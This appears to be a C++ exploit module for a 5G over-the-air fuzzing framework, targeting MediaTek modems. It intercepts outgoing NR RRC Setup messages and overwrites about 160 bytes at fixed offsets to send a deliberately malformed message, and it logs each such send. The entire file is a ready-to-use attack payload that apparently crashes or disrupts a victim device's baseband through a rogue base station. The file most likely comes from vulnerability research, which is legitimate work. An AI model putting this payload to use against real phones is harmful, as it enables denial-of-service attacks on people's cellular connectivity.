#include <ModulesInclude.hpp>
// Filters
wd_filter_t f1;
// Vars
const char *module_name()
{
    return "Mediatek";
}
// Setup
int setup(wd_modules_ctx_t *ctx)
{
    // Change required configuration for exploit
    ctx->config->fuzzing.global_timeout = false;
    // Declare filters
    f1 = wd_filter("nr-rrc.rrcSetup_element");
    return 0;
}
// TX
int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    // Register filters
    wd_register_filter(ctx->wd, f1);
    return 0;
}
int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    if (wd_read_filter(ctx->wd, f1)) {
        wd_log_y("Malformed rrc setup sent!");
        pkt_buf[74 - 48] = 0x9a;
        pkt_buf[568 - 48] = 0x20;
        pkt_buf[569 - 48] = 0x80;
        pkt_buf[570 - 48] = 0xa0;
        pkt_buf[571 - 48] = 0x00;
        pkt_buf[572 - 48] = 0x72;
        pkt_buf[573 - 48] = 0xa0;
        pkt_buf[574 - 48] = 0xa0;
        pkt_buf[575 - 48] = 0x0c;
        pkt_buf[576 - 48] = 0x45;
        pkt_buf[577 - 48] = 0x55;
        pkt_buf[578 - 48] = 0x50;
        pkt_buf[579 - 48] = 0x02;
        pkt_buf[580 - 48] = 0x70;
        pkt_buf[581 - 48] = 0x03;
        pkt_buf[582 - 48] = 0x04;
        pkt_buf[583 - 48] = 0xea;
        pkt_buf[584 - 48] = 0x80;
        pkt_buf[585 - 48] = 0x0a;
        pkt_buf[586 - 48] = 0x88;
        pkt_buf[587 - 48] = 0x40;
        pkt_buf[588 - 48] = 0x0a;
        pkt_buf[589 - 48] = 0x00;
        pkt_buf[591 - 48] = 0xe0;
        pkt_buf[592 - 48] = 0x26;
        pkt_buf[593 - 48] = 0x09;
        pkt_buf[594 - 48] = 0xd5;
        pkt_buf[595 - 48] = 0x00;
        pkt_buf[596 - 48] = 0x07;
        pkt_buf[597 - 48] = 0x10;
        pkt_buf[598 - 48] = 0x80;
        pkt_buf[599 - 48] = 0x14;
        pkt_buf[600 - 48] = 0x14;
        pkt_buf[601 - 48] = 0x01;
        pkt_buf[602 - 48] = 0xc0;
        pkt_buf[603 - 48] = 0x8c;
        pkt_buf[604 - 48] = 0x13;
        pkt_buf[605 - 48] = 0xaa;
        pkt_buf[606 - 48] = 0x00;
        pkt_buf[608 - 48] = 0x21;
        pkt_buf[609 - 48] = 0x00;
        pkt_buf[610 - 48] = 0x28;
        pkt_buf[611 - 48] = 0x50;
        pkt_buf[612 - 48] = 0x00;
        pkt_buf[613 - 48] = 0x40;
        pkt_buf[617 - 48] = 0x08;
        pkt_buf[618 - 48] = 0x00;
        pkt_buf[619 - 48] = 0x20;
        pkt_buf[620 - 48] = 0x10;
        pkt_buf[621 - 48] = 0x00;
        pkt_buf[622 - 48] = 0x42;
        pkt_buf[623 - 48] = 0x70;
        pkt_buf[624 - 48] = 0x5d;
        pkt_buf[625 - 48] = 0x00;
        pkt_buf[626 - 48] = 0x15;
        pkt_buf[627 - 48] = 0x28;
        pkt_buf[628 - 48] = 0x01;
        pkt_buf[629 - 48] = 0xc3;
        pkt_buf[630 - 48] = 0x74;
        pkt_buf[631 - 48] = 0x00;
        pkt_buf[632 - 48] = 0x1c;
        pkt_buf[633 - 48] = 0xa0;
        pkt_buf[634 - 48] = 0xa7;
        pkt_buf[635 - 48] = 0x15;
        pkt_buf[636 - 48] = 0xd0;
        pkt_buf[637 - 48] = 0x00;
        pkt_buf[638 - 48] = 0x02;
        pkt_buf[639 - 48] = 0x85;
        pkt_buf[640 - 48] = 0x02;
        pkt_buf[641 - 48] = 0x00;
        pkt_buf[643 - 48] = 0x04;
        pkt_buf[644 - 48] = 0x04;
        pkt_buf[646 - 48] = 0x10;
        pkt_buf[647 - 48] = 0x00;
        pkt_buf[650 - 48] = 0x40;
        pkt_buf[651 - 48] = 0xa9;
        pkt_buf[652 - 48] = 0x00;
        pkt_buf[653 - 48] = 0xc0;
        pkt_buf[654 - 48] = 0x28;
        pkt_buf[655 - 48] = 0x00;
        pkt_buf[656 - 48] = 0x30;
        pkt_buf[657 - 48] = 0x5c;
        pkt_buf[658 - 48] = 0x00;
        pkt_buf[659 - 48] = 0x30;
        pkt_buf[660 - 48] = 0xb1;
        pkt_buf[661 - 48] = 0x01;
        pkt_buf[662 - 48] = 0x40;
        pkt_buf[663 - 48] = 0x48;
        pkt_buf[664 - 48] = 0x01;
        pkt_buf[665 - 48] = 0x50;
        pkt_buf[666 - 48] = 0x64;
        pkt_buf[667 - 48] = 0x01;
        pkt_buf[668 - 48] = 0x50;
        pkt_buf[669 - 48] = 0xb9;
        pkt_buf[670 - 48] = 0x01;
        pkt_buf[671 - 48] = 0xc0;
        pkt_buf[672 - 48] = 0x68;
        pkt_buf[673 - 48] = 0x02;
        pkt_buf[674 - 48] = 0x70;
        pkt_buf[675 - 48] = 0x6c;
        pkt_buf[676 - 48] = 0x02;
        pkt_buf[677 - 48] = 0x70;
        pkt_buf[678 - 48] = 0xa5;
        pkt_buf[679 - 48] = 0xa0;
        pkt_buf[680 - 48] = 0x40;
        pkt_buf[681 - 48] = 0x8b;
        pkt_buf[682 - 48] = 0x20;
        pkt_buf[683 - 48] = 0x1c;
        pkt_buf[684 - 48] = 0x20;
        pkt_buf[685 - 48] = 0x8e;
        pkt_buf[686 - 48] = 0x31;
        pkt_buf[687 - 48] = 0xf8;
        pkt_buf[688 - 48] = 0x1a;
        pkt_buf[689 - 48] = 0x20;
        pkt_buf[690 - 48] = 0x02;
        pkt_buf[691 - 48] = 0xc0;
        pkt_buf[692 - 48] = 0x90;
        pkt_buf[693 - 48] = 0x10;
        pkt_buf[694 - 48] = 0x10;
        pkt_buf[695 - 48] = 0x54;
        pkt_buf[696 - 48] = 0xc1;
        pkt_buf[697 - 48] = 0x68;
        pkt_buf[698 - 48] = 0x20;
        pkt_buf[699 - 48] = 0x43;
        pkt_buf[700 - 48] = 0x08;
        pkt_buf[701 - 48] = 0x07;
        pkt_buf[702 - 48] = 0x10;
        pkt_buf[703 - 48] = 0x23;
        pkt_buf[704 - 48] = 0x8c;
        pkt_buf[705 - 48] = 0x7e;
        pkt_buf[706 - 48] = 0x06;
        pkt_buf[707 - 48] = 0x88;
        pkt_buf[708 - 48] = 0x00;
        pkt_buf[709 - 48] = 0xc0;
        pkt_buf[710 - 48] = 0x44;
        pkt_buf[711 - 48] = 0x04;
        pkt_buf[712 - 48] = 0x08;
        pkt_buf[713 - 48] = 0x15;
        pkt_buf[714 - 48] = 0x30;
        pkt_buf[715 - 48] = 0x5a;
        pkt_buf[716 - 48] = 0x0c;
        pkt_buf[717 - 48] = 0x18;
        pkt_buf[718 - 48] = 0xd2;
        pkt_buf[719 - 48] = 0x01;
        pkt_buf[720 - 48] = 0xc6;
        pkt_buf[721 - 48] = 0x08;
        pkt_buf[722 - 48] = 0xe3;
        pkt_buf[723 - 48] = 0x1f;
        pkt_buf[724 - 48] = 0x81;
        pkt_buf[725 - 48] = 0xa2;
        pkt_buf[726 - 48] = 0x00;
        pkt_buf[727 - 48] = 0x34;
        pkt_buf[728 - 48] = 0x19;
        pkt_buf[729 - 48] = 0x01;
        pkt_buf[730 - 48] = 0x03;
        pkt_buf[731 - 48] = 0x05;
        pkt_buf[732 - 48] = 0x4c;
        pkt_buf[733 - 48] = 0x00;
        pkt_buf[734 - 48] = 0x3f;
        pkt_buf[735 - 48] = 0x00;
        return 1;
    }
    return 0;
}
